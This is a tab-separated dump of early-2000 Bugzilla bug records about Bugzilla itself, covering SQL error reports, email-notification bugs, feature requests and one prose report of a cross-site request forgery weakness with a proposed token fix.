23196%TAB%947088978%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%[DOGFOOD]TM and QAC fields missing in bug descriptions%TAB%[DOGFOOD]TM and QAC fields missing in bug descriptionsRight now I'm not seeing any Target Milestone or QA Contact fields in bugs shown in bugzilla.  I just submitted changes to a bug, and I got the following diffs. These fields are being lost.  Is this just me or are others seeing this?  From nobody@mozilla.org  Wed Jan  5 20:09:43 2000 Date: Wed, 5 Jan 2000 17:09:41 -0800 (PST) From: bugzilla-daemon@mozilla.org To: warren@netscape.com, dbaron@fas.harvard.edu Cc: mscott@netscape.com, lchiang@netscape.com Subject: [Bug 22166] Changed - CPU Usage spikes after sending message  http://cvs-mirror.mozilla.org/webtools/bugzilla/show_bug.cgi?id=22166  *** shadow/22166        Wed Jan  5 16:50:59 2000 --- shadow/22166.tmp.22895      Wed Jan  5 17:09:40 2000 *************** *** 10,17 ****   Component: Networking-Mail   AssignedTo: warren@netscape.com   ReportedBy: dbaron@fas.harvard.edu - QAContact: esther@netscape.com - TargetMilestone: M13   URL:   Cc: mscott@netscape.com, lchiang@netscape.com   Summary: CPU Usage spikes after sending message --- 10,15 ---- *************** *** 55,57 **** --- 53,58 ----   ------- Additional Comments From warren@netscape.com  2000-01-05 16:50 -------  I can't reproduce this, and the stack traces don't give me any clues. They just   seem like random snapshots of normal activity. + + ------- Additional Comments From dbaron@fas.harvard.edu  2000-01-05 17:09 ------- + I'm still seeing this on the opt build 2000-01-04-09-M13 (Linux mozilla).  David Baron :dbaron: (⌚️UTC-4, no longer working on Mozilla) Reporter	  Comment 1 • 25 years ago Actually, I don't think the data are being lost, since the changes didn't show up in view-bug-activity.  I guess seeing this in the diffs just means bugzilla has stopped caring about these fields and is no longer including them in the text printouts it uses to make the diffs.  However, this is still a serious problem.
23453%TAB%947363986%TAB%4412%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Broken keywords/cc query.%TAB%Broken keywords/cc query.Please stand by ...  Content-type: text/html  Software error:  select bugs.bug_id, bugs.groupset, date_format(bugs.delta_ts,'Y-m-d'), substring(bugs.bug_status,1,4), substring(bugs.resolution,1,4), substring(bugs.product, 1, 8), bugs.votes, bugs.target_milestone, substring(bugs.short_desc, 1, 60) from bugs left join cc on bugs.bug_id = cc.bug_id left join profiles ccname on cc.who = ccname.userid, profiles assign, profiles report left join profiles qacont on bugs.qa_contact = qacont.userid, versions projector where bugs.assigned_to = assign.userid and bugs.reporter = report.userid and bugs.product = projector.program and bugs.version = projector.value and bugs.groupset & 0 = bugs.groupset and keywords.bug_id = bugs.bug_id and (keywords.keywordid = 2) group by bugs.bug_id : at globals.pl line 69.  Please send mail to this site's webmaster for help.
23473%TAB%947414557%TAB%6793%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%Able to sort by "Ascending" and "Descending",Able to reverse sort of bug_list.cgi ("Ascending" and "Descending")%TAB%Able to sort by "Ascending" and "Descending",Able to reverse sort of bug_list.cgi ("Ascending" and "Descending")I have a link to all the bugs I've reported and would like the newest ones to be at the top instead of at the buttom.  It would therefore be cool if if was possible to sort ascending and descending. If could just be an addition to the dropdown box instead of just: "Bug Number" "Importance" "Blabla"  the dropdown box would just be: "Bug Number - Ascending" "Bug Number - Descending" "Importance - Ascending" "Importance - Descending" "Blabla - Ascending" "Blabla - Descending"
23513%TAB%947489526%TAB%5571%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%editproducts has a bad datatype%TAB%editproducts has a bad datatypeI received the following message in the .../httpd/error_log file.  error_log.1:[Fri Jan  7 12:54:55 2000] editproducts.cgi: Argument "" isn't numeric in ne at /home/httpd/html/bugzilla/editproducts.cgi line 607.  I'm not sure what caused the problem, but the action I was taking was the re- enabling of the project.  I fixed the problem by changing the numeric comparison from '!=' to 'ne' (textural)
23721%TAB%947632480%TAB%1833%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%"Change several bugs.." link does not maintain sort%TAB%"Change several bugs.." link does not maintain sortWhen I have sorted my bugs (I keep sorted queries in my bookmarks) and I click "Change serveral bugs at once" the list I get back is completely unsorted, which makes it hard to pick which bugs you wanted to change
23808%TAB%947698868%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Need keyword field to be available as a column to sort%TAB%Need keyword field to be available as a column to sortHi terry-  I know you know we would like this, but I am finding it is critical to utilizing the keyword field.  I need to see them a column when I do my queries. Status Summary was there.  i.e. Need to see what bug open for M13 are perf related vs. dogfood related..etc.  Hopefully you can get to this soon :-)
23897%TAB%947776002%TAB%9754%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Typos in bug_status.html:  "ship[s]" & "the[y]"%TAB%Typos in bug_status.html:  "ship[s]" & "the[y]"There are two typos under VERIFIED in bug_status.html:  "ship" vs. "ships" and "the" vs. "they".  Corrected text of paragraph is as follows:  QA has looked at the bug and the resolution and agrees that the appropriate resolution has been taken.  Bugs remain in this state until the product they were reported against actually ships, at which point they become CLOSED.
24056%TAB%947932704%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%can't add text to bugzilla bug%TAB%can't add text to bugzilla bugI typed the following text into bug 15316's comment field: "What does the user's chosen font size map to in NN 4.x?  Is it 'medium'?  If so, it might be better to map to medium in both quirks and strict." hit "Submit", and got the page below.  Something's wrong...  =============  Bug processed         Query page      Enter new bug  Content-type: text/html  Software error:  select delta_ts, area,assigned_to,bug_file_loc,bug_severity,bug_status,component,groupset,op_sys,priority,product,qa_contact,rep_platform,reporter,resolution,short_desc,status_whiteboard,target_milestone,version,votes from bugs where bug_id = 15316: at globals.pl line 71.  Please send mail to this site's webmaster for help.
24138%TAB%948045470%TAB%8444%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%OpSys menu is horked%TAB%OpSys menu is horkedOn the query page, the operating system menu is now identical to the Platform menu -- it gives a list of platforms, rather than of operating systems.
24327%TAB%948223349%TAB%6303%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%"Any of the listed Keywords set" feature not working yet%TAB%"Any of the listed Keywords set" feature not working yet* Overview: It is not currently possible to search for more than one keyword in the Keyword field on the Bugzilla Query Page, despite the "Any of the listed Keywords set" search option for that field (currently the only option). This will affect anyone hunting to find an existing bug for css issues who does not know what level of css that bug would be reported against and wants to search against all of them at once.  Presumably there will also be an "All of the listed Keywords set" option, and neither are working quite yet. In any case it does not look like the string entered into the field is being parsed at all yet.  * Steps to reproduce: 1. Bring up http://bugzilla.mozilla.org/query.cgi in any browser. 2. Enter "css1 css2 css3" in the Keywords field, and anything at all anywhere    else, as a real query. 3. Submit the query.  Actual Results: A page appears with a URL that looks like that of a bug list, but with this content:   >Please stand by ...    >Unknown keyword named css1 css2 css3.    >The legal keyword names are listed here.  * Expected Results: A Bug List including all of the bugs that have "css1" or "css2" or "css3" in the Keywords field and otherwise fit the rest of the search critera.
24496%TAB%948334365%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Forbid resolving fixed when there're unresolved dependencies.%TAB%Forbid resolving fixed when there're unresolved dependencies.It annoys me how people go about marking things fixed when there are dependencies that are unresolved.  You could certainly resolve this as WONTFIX, INVALID, etc, but something can't possibly be fixed in this case.  Either the person should resolve the dependencies (if they're real deps) or remove them (if not).  Of course it can be legitimate for a resolved fixed bug to depend on an open bug, but this only occurs if the dependant bug is fixed before the dependee is reopened.
24644%TAB%948424128%TAB%2365%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Search for bugs not changed in X days%TAB%Search for bugs not changed in X daysThe bugzilla search form needs a way to search for "bugs not changed in X days",  as well as the existing "bugs changed in X days".   This would make it easier to  track bug reports with a patch attached (and marked 'patch' in the keywords  field), that have not been given the appropriate attention for prompt review and  checkin.
24697%TAB%948457752%TAB%3853%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Keyword links grab all bugs, not just open one.s,Keyword links grab all bugs, not just open ones,describekeywords shows count of ALL bugs, not just open ones,make describekeywords only count open bugs,Display search link for open bugs for each keyword in describekeywords.cgi%TAB%Keyword links grab all bugs, not just open one.s,Keyword links grab all bugs, not just open ones,describekeywords shows count of ALL bugs, not just open ones,make describekeywords only count open bugs,Display search link for open bugs for each keyword in describekeywords.cgi- Go to the Keywords page: http://bugzilla.mozilla.org/describekeywords.cgi  - Click on one of the links in the column at the right of the page which shows  the bug count corresponding to the keyword. For instance, click on the link that  shows the bug count for 'css1'. As of today, it shows a count of 121.   Problem: The bug list shows all the bugs corresponding to the keyword regardless  of their state.   Expected result: The bug list should not show the bugs that have been resolved  or fixed. The bug count should only show the opened bugs.   Or maybe there should that column should be All Bugs and another one Open Bugs?  what do you think?
24789%TAB%948530231%TAB%9996%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Estimated/Actual Time to Fix, Percent Complete Fields,[E|A|R] Add Estimated, Actual, Remaining Time Fields,[E|A|R|%] Add Estimated, Actual, Remaining Time Fields, Percent Completed Field,[E|A|R] Add Estimated, Actual, Remaining Time Fields%TAB%Estimated/Actual Time to Fix, Percent Complete Fields,[E|A|R] Add Estimated, Actual, Remaining Time Fields,[E|A|R|%] Add Estimated, Actual, Remaining Time Fields, Percent Completed Field,[E|A|R] Add Estimated, Actual, Remaining Time FieldsThis is request to add a few new fields to Buzillla:   "Estimated Time Required to Fix"   "Percent Complete"   "Actual Time Requried to Fix"   These fields are critical to anyone using Buzilla to manage the development  process (I think that includes everyone using Bugzilla). It's one thing to know  that there are "X" bugs to fix, but it's much more useful to know that it will  take "Y" man days to get to a milestone.  This can also help when balancing out workloads. Programmer A may have only 5  bugs, but they will take 100 man days to complete, while Programmer B may have  25 bugs, but they are relatively simple and can be completed in a week, so he  can be assigned some of Programmer A's bugs and the job will be completed  sooner than the 100 days. I need to know that kind of information in order to  accurately estimate the date a project will be completed.  These fields will also allow developers and managers to become better over time  about estimating target dates by looking at historical data. "Joe always  underestimates the time by 20%, so let's factor that in to our estimates".   Along with these new fields, the summary reports and queries would need to be  modified to give man day totals.
24790%TAB%948533631%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%When adding a new component, the result page says "Adding New Product"%TAB%When adding a new component, the result page says "Adding New Product"Using Bugzilla 2.8, the editcomponents.cgi script places the title "Adding new  product" at the top of the page when it's confirming that you have added a new  component.  This is at line 361 in editcomponents.cgi  if ($action eq 'new') {     PutHeader("Adding new product");     CheckProduct($product);
24792%TAB%948539129%TAB%5168%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Software error%TAB%Software errorSearching in Description using "all words" is broken:  Software error:  select bugs.bug_id, bugs.groupset, substring(bugs.bug_severity, 1, 3),  assign.login_name, bugs.short_desc from bugs, profiles assign, profiles report left join profiles qacont on  bugs.qa_contact = qacont.userid, versions projector , longdescs where bugs.assigned_to = assign.userid and  bugs.reporter = report.userid and bugs.product = projector.program and bugs.version = projector.value and  bugs.groupset & 0 = bugs.groupset and ( bugs.product = 'Browser' ) and ( bugs.bug_status = 'NEW' or  bugs.bug_status = 'ASSIGNED' or bugs.bug_status = 'REOPENED' ) and longdescs.bug_id = bugs.bug_id and  (lower(long_desc) regexp '(^|[^a-z0-9])mats\\@symsoft\\.se($|[^a-z0-9])' and lower(long_desc) regexp '(^|[^a-z0-9])alink($|[^a-z0-9])') group by bugs.bug_id order by bugs.bug_id: at  globals.pl line 72.
24798%TAB%948549551%TAB%9060%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%description no longer searches email addresses of comment posters%TAB%description no longer searches email addresses of comment postersI used to put dan@ss-i.com in the description field on the query page to search for all the bugs for which I've posted a comment, but this no longer works.  It would be very usefull for me if this were added back in, or perhaps added to the email search fields instead.
24802%TAB%948558867%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%text of "here's your password" email can't be edited in tweakparams%TAB%text of "here's your password" email can't be edited in tweakparamsUsing Bugzilla 2.9, to edit the text of the "here's your password" email, you currently have to edit CGI.pl.  Would be nice if this could be edited along with the rest of the email templates in the tweakparams.cgi.
24803%TAB%948559394%TAB%3794%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Duplicate profiles entries exist!%TAB%Duplicate profiles entries exist!In the bugzilla.mozilla.org installation, this query comes up with 52 rows:   select p1.userid from profiles as p1, profiles as p2 where p1.userid != p2.userid and p1.login_name = p2.login_name;  This is bad.  I need to figure out a good way to fix it.  I also need to change the tables so that it can't happen again...
24804%TAB%948561748%TAB%22599%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Show realnames for persons%TAB%Show realnames for personsBugzilla uses email addresses everywhere to identify people. This makes sense for input, but there are the following problems: - In my case, it's relatively easy to guess, that ben.bucksch@uumail.de and   mozilla@bucksch.org are owned by the same person, but it is not always so   easy. - Sometimes, it's useful to directly address a certain person and   py8ieh=bugzilla@bath.ac.uk doesn't sound nice.  At least, use the realname in the header for comments, e.g. ------- Ben Bucksch <mozilla@bucksch.org>  1999-10-12 16:36 -------
24806%TAB%948567679%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Adding a component doesn't verify the owner address,Adding a component should prompt before creating account for u  nknown owner,components table should use key for owner and qacontact instead of tinytext,Adding a component doesn't verify the owner address%TAB%Adding a component doesn't verify the owner address,Adding a component should prompt before creating account for u  nknown owner,components table should use key for owner and qacontact instead of tinytext,Adding a component doesn't verify the owner addressWhen adding a component in editcomponents.cgi, it does not verify that the person you assign as the owner of that component has an account. (Bugzilla 2.9, cvs  updated this afternoon) I have since discovered that it adds an account for that person if they don't already have one, if you assign someone as an owner of a component.  This is actually kind of cool, but in case you made a typo or something, it should probably prompt you to confirm you want to add an account for this person before actually doing it.  "This person doesn't have a Bugzilla account yet.  Create one for them?" or something like that.
24823%TAB%948618325%TAB%4726%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%The top of a bug desccription should have last modified date,The top of a bug description should have last modified date%TAB%The top of a bug desccription should have last modified date,The top of a bug description should have last modified dateThere are often bugs that I watch, but am not CCed.  Many of these bugs may have  several comments.  I would be nice to have a the top of a bug description next  to the bug number a last updated field and/or a last commented filed.  This would keep one from scrolling down though the comments just to find the bug  had not been changed in 2 months.  Last updated field: is last time any thing on the bug changed (priority,  component, ect...)  Last Commented field is the last time a text comment was added in the additional  comments section.  The last comments ones is the one i would rather have, but either or both would  be hepful.
24896%TAB%948711257%TAB%9060%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%browsing two lists doesn't work,allow browsing of multiple buglists,Make First/Last/Prev/Next Work with multiple buglists at once%TAB%browsing two lists doesn't work,allow browsing of multiple buglists,Make First/Last/Prev/Next Work with multiple buglists at onceWhen I am searching through two seperate bug list queries in two different windows, the First, Last, Prev, Next, and Show list links work off of the latest query that I preformed.  Steps to reproduce: Run a query in bugzilla. Open a bug from that query list. Open a new window. Run a different query in that window. Go back to the first window and click on the Show list link.  Result: The list shown is from the second query.  Expected Result: Should show the list from the first query.
24967%TAB%948758465%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%More visual when no component has been selected%TAB%More visual when no component has been selectedWhen posting a bug report and youi forgot to select a component, you'll get a  error message saying "You must choose a component that corresponds to this bug. If necessary, just  guess. But please hit the Back button and choose a component."  BUT this error message is almost impossible to notice, since it looks so much  like the ordinatry bug reportted ok.  Please make the text RED!  I've lost many bug reports due to this!
24976%TAB%948773862%TAB%3881%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new email system does weird things with dependencies%TAB%new email system does weird things with dependenciesThe new email system seems to send mail for dependencies when it shouldn't.  I added a *comment* to bug 1312, and I noticed that email was sent to Ian (py8ieh=bugzilla@bath.ac.uk) for that bug and bug 2479 and bug 8780.  It seems the new email system is sending email for dependencies in all cases, whether anything changed or not.  I'll attach the email diffs Ian got, which he forwarded to me when I mentioned the problem to him.
24987%TAB%948792405%TAB%1584%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%New email notification system always uses the last comments.%TAB%New email notification system always uses the last comments.The new email notification system always uses the last comments.  This is incorrect for the changes that do not have associated comments.  For example, it is legal to change the priority of a bug or accept a bug without adding comments.  The notification for such a change would be confusing with unrelated comments.
24993%TAB%948794488%TAB%4424%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla main page should put focus in bug # field%TAB%Bugzilla main page should put focus in bug # fieldIt would be nice if when going to the main bugzilla page (bugzilla.mozilla.org)  that the focus by default was in the "Show Mozilla bug no." field so that when  you go to that page to look at a particular bug #, you just have to type the #  and hit enter and you don't have to click in the field first.  Obviously not a critical bug, just something to look at the next time you're  updating the main bugzilla page.  Thanks.
25010%TAB%948800997%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Documentation missing for groups,Need a way to edit the list of available groups%TAB%Documentation missing for groups,Need a way to edit the list of available groupsOK, from more investigating on this stuff, it looks like there's something  missing in the current Bugzilla distribution.  As stated above, there is a group  bit available for "Has the ability to create and destroy groups".  There is  nowhere in Bugzilla to excercise this privilege.  Did there used to be an  editgroups.cgi that somehow disappeared out of the tree?  Or was this an intended  feature that never got implemented?
25033%TAB%948815870%TAB%3853%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Keyword field does not print out ,Keyword field does not print out%TAB%Keyword field does not print out ,Keyword field does not print outterry-  When I print out the bugs for the PDT mtg (full view) the keyword field does not  show up.  Can you add this to the print out?
25044%TAB%948834782%TAB%4126%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%[regression]Can't do queries based on date of comments anymore%TAB%[regression]Can't do queries based on date of comments anymoreI used to make Bugzilla queries based on the date of comments that I made on bug  reports, looking for strings like the one below in the description field:       "Additional Comments From pierre@netscape.com  2000-01-1"  It doesn't work anymore. I think it was broken in the past few days. It's a bit  annoying, I used to fill out my weekly status reports using that method.  Maybe the problem is related to the "Added comment" checkbox in the Query page. I  don't remember having seen it before. Another solution would be to have this  checkbox followed by a text field allowing you to enter a number of days (ie. < username> added comments in the last <xx> days).
25275%TAB%948967465%TAB%280%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Query/Bug List%TAB%allow urls to be shown in list of bugs,allow url column to be shown in list of bugs in Bugzilla 3.0,allow url column to be shown in list of bugs%TAB%allow urls to be shown in list of bugs,allow url column to be shown in list of bugs in Bugzilla 3.0,allow url column to be shown in list of bugsI noticed that you can customize what columns are shown when you have a list of  bugs, and I was curious if the URL of the bug could be made into a column here?   It would be helpful when trying to find a specific bug, or set of bugs, based on  urls.
25389%TAB%948991703%TAB%7279%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%new boolean thingie doesn't work with M13.%TAB%new boolean thingie doesn't work with M13.
25393%TAB%948994105%TAB%8523%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%Bugzilla query page error.%TAB%Bugzilla query page error.I cannot get the wuery page to load completely.  At the bottom is the error  message:  Can't call method "query" without a package or object reference at globals.pl  line 91.   This may be a duplicate, but since I can't query...
25521%TAB%949056002%TAB%3853%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Keyword field in new bug entry%TAB%Keyword field in new bug entryterry-  Can you make it so the keyword field is available to info entry in the  http://bugzilla.mozilla.org/enter_bug.cgi page.  This was the eng could add "helpwanted" or whatever when writing the bug.   thanks!
25620%TAB%949086217%TAB%10724%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl: errors while upgrading from 2.8 to 20-Jan-2000%TAB%checksetup.pl: errors while upgrading from 2.8 to 20-Jan-2000Overview Description:  	I installed Bugzilla 2.8, then attempted to update it to the version I           got from CVS (as of 28-Jan-2000, 21:00 EST).  As instructed, I reran             checksetup.pl.  It reported several errors.  Steps to Reproduce: 	- Install and initialize Bugzilla 2.8 from the tarball 	- Set yourself up as the (only) user; rerun checksetup.pl to set up                group memberships 	- Edit the maintainer and urlbase operating parameters using the form 	- Create a bug (in the test product/component) 	- Create a new component in the test product (*no* spaces in its name) 	- Create a bug in the new component 	- Upgrade Bugzilla to the version specified above: 		"cvs update" in an offline directory 		"cvs import" the new version into my local Bugzilla repository 		cd to my local Bugzilla sandbox 		"cvs update -jold -jnew" to merge the changes into my local work 		Resolve conflicts 		"cvs commit" 	- In live Bugzilla directory: 		"cvs update" to finally install the new version 		./checksetup.pl  Actual Results:  	- checksetup.pl's screen output is included as an attachment 	- database is in an unknown (but presumably inconsistent) state  Expected Results:  	- no reported errors  Build Date & Platform Bug Found:  	- Sun Sparc 5 	- Solaris 2.5.1 	- Old Bugzilla: 2.8 tarball 	- New Bugzilla: from CVS as of 28-Jan-2000 21:00 EST 	- Perl 5.005_03 	- DBI 1.13 	- Msql-Mysql-modules 1.2210   Additional Builds and Platforms Tested On:  	(none)  Additional Information:  	- Also attached: localconfig and data/params from *after* the failed 	  checksetup.pl run 	- If I wipe everything clean and do a fresh install of the 20-Jan-2000 	  bugzilla: 		- checksetup.pl does *not* report any errors 		- I can successfully add a bug 	- My local code changes are trivial: fixing #! lines and dicing a MySQL 	  password into globals.pl
25632%TAB%949097794%TAB%4212%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%processmail regenerate makes progressively larger shadow files%TAB%processmail regenerate makes progressively larger shadow fileswhen running processmail with prettyasciimail turned on the files in the shadow directory each contain all of the pretty text from _ALL_ of the bugs gone before it to that point. I've fixed it on my local copy and am attaching a patch.
25636%TAB%949099862%TAB%4212%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%make globals.pl use the db_{host,name,user,pass} variables from localconfig%TAB%make globals.pl use the db_{host,name,user,pass} variables from localconfigattached is a patch to make globals.pl use the db_* variables from the localconfig file
25693%TAB%949158011%TAB%4590%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%request for a table for duplicates ,request for a table for duplicates%TAB%request for a table for duplicates ,request for a table for duplicatesIt would be nice if we could query for bugs which had the most duplicates to make it easy to generate the "Most Frequently Filed bugs".  I think a table that ahd the bug number and a tally for the # of bugs that are  duplicates of that bug would be fine (ie not have to manage a list of bugs that  are duplicates of the bug)... If we want to see details fo the duplicates, that  info is stored in the comment.
26074%TAB%949398016%TAB%6303%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%[RFE] Ability to limit search: bugs without Additional Comments,[RFE] Ability to limit search by number of Comments,Ability to limit search by number of Comments%TAB%[RFE] Ability to limit search: bugs without Additional Comments,[RFE] Ability to limit search by number of Comments,Ability to limit search by number of CommentsRequested: a way to limit searches to just those bug reports to which no additional comments have been made since they were reported.  The bugs that most need attention on the "Browser-General" list are those that have been in the database for some time but nobody has added any comments to yet. Among the bugs one or more weeks old, most have had some comment added, so at present there is no good way to zero in on these bugs.  Now that boolean charts have been added, it would always be possible to AND a search with the bugs that do not contain the string "-- Additional Comments From", but that would be brutally expensive.  Since it probably isn't going to ever be necessary to know the number of comments added, this would amount to adding a boolean field, set to 0 when a  bug is created, and set to 1 when a comment is added.  Enabling this would allow both those prescreening older "Browser-General" bugs  and those prescreening recent bugs across all components to concentrate on those not already touched, reducing duplication of effort.
26136%TAB%949415038%TAB%3794%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%You can specify illegal bug numbers when marking duplicates!%TAB%You can specify illegal bug numbers when marking duplicates!It turns out nothing is checking that bug numbers are legal when you mark a bug as a duplicate of another one.  This has already lead to at least one bogus entry in the bugzilla.mozilla.org database.
26194%TAB%949448041%TAB%4126%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%New email notification scheme doesn't tell me why I'm a recipient,Header explaining reason d'etre for email in New email notification scheme%TAB%New email notification scheme doesn't tell me why I'm a recipient,Header explaining reason d'etre for email in New email notification schemeAfter a few days using the "experimental and bleeding edge" email notification, I  noticed the following problem: when I receive a Bugsplat notification, I can't  tell why I'm on the recipient list.  With the previous system: - If my address was in 1st position on the "To" line, I knew I was the Assignee. - If my address was in 2nd position on the "To" line, I knew I was the Reporter. - If my address was on the "CC" line, I knew I was just CC'd.  With the new system, I can't tell why I'm spammed.  Could you add a line saying "You received this mail because you are the Reporter  / the Assignee" or "on the CC list"? Thanks-a-bunch.
26242%TAB%949482587%TAB%11096%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Instructions for installing the GD Perl module%TAB%Instructions for installing the GD Perl moduleIn the README file under the installation section, you might want to point out and reference all of the dependencies that  the GD Perl module has (libgd, libpng, etc) even though they are listed in the GD Perl module readme. This will make it easier to download all of the necessary items before doing the install.
26257%TAB%949488374%TAB%3794%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%Bugzilla vulnerable to attacks on stupid users.,Bugzilla should prevent malicious webpages from making bugzilla users submit changes to bugs.,[SECURITY] Bugzilla should prevent malicious webpages from making bugzilla users submit changes to bugs.%TAB%Bugzilla vulnerable to attacks on stupid users.,Bugzilla should prevent malicious webpages from making bugzilla users submit changes to bugs.,[SECURITY] Bugzilla should prevent malicious webpages from making bugzilla users submit changes to bugs.To paraphrase mail received from dshea@netscape.com:      It's possible to create an url that is the equivalent of a form post     to the Bugzilla process_bug.cgi, from a page that is not served by     Bugzilla.  This would give someone the ability to create a link that     says, "Click on Me!" which would actually have an url to     http://bugzilla.mozilla.org/process_bug.cgi, with params to make it     make undesirable changes to that bug.  The changes would appear to be     made by the stupid user who clicks on the link, since it will use that     person's login cookie  It seems to me a simple way to solve this is to require a magic token on such URLs.  Bugzilla would generate these magic tokens and put them in hidden form elements.  The server would check that the received token came from the machine it was sent to and that it was generated within the last few days.
26316%TAB%949506753%TAB%3862%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Colum heading lengths...%TAB%Colum heading lengths...For example, there's no sense in the table heads "Votes", "Target" or "Result"  being spelled all out because those fields are empty much of the time, and  rarely longer than three letters. They should probably be shortened like "ID" or  "Plt" - altough it's hard to say, best would be let users choose the headings,  but that'd be a pain. "Vts", "Rslt", "Trg" etc. may not tell much... but at any  case, as they stand currently, including those three takes most of the screen  real-estate for practically empty fields.
26628%TAB%949676691%TAB%8817%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Custom query in footer user pref ignored%TAB%Custom query in footer user pref ignoredif I create a custom query, name it, and save it, I cannot convince bugzilla to show it in the footer of every page. I select that in my prefs, save it, and it pops back up with the combo-box on "only query page" and the footer unchanged.
27008%TAB%950016871%TAB%1698%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[nitpick] Naming/logic errors in bugzilla welcome page%TAB%[nitpick] Naming/logic errors in bugzilla welcome pageThe "Before reporting a bug" section contains:  "Use the Bug Helper to report bugs. This form helps you write well written bug reports."  Umm...  * it's actually the Bugzilla Helper.  * the list that this was added to is for things to do before writing a bug. (e.g.  if you're using the Bugzilla Helper, you can't be doing it before reporting a  bug, since you're by definition reporting the bug if you're using it. ;)
27146%TAB%950106666%TAB%5293%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Server Operations,Bugzilla,Bugzilla-General%TAB%Need evaluation of Bugzilla perfomance and scalability limits%TAB%Need evaluation of Bugzilla perfomance and scalability limitsRisto,  filing (edited) questions/comments from chofmann as a bug as you  requested.  __ It would also be good to get an idea about the source  of the recent bugzilla performance problems that have been  observed by many engineers and testers.   If these performance problems are the result of  of the system not scaling to current levels of bug entry and  query traffic, then  this problem could only get worse.   Can we get any estimates on the "entry and query transaction  rates" that bugzilla can support?  Are we anywhere close to  those limits?  Also, can we get someone to look at performance and scalibility    Active Users     90 netscape engineers + 30-40 active mozilla contributor engineers.      35 netscape qa testers + 200-300 active mozilla testers that download the  daily builds.      -- ~465 active mozilla contributors       -- ???? -total number of bugzilla accounts (is this data available?)      ---???? -active bugzilla users( a transaction or two in the last month                   - is this data available and monitored, has it moved much  lately)?   Causal Users.  ~20,000-30,000  full circle build milestone testers  ~120,000 milestone testers   We need a plan to preserve performance and usability of bugzilla for the roughly  500 very active mozilla contributors.
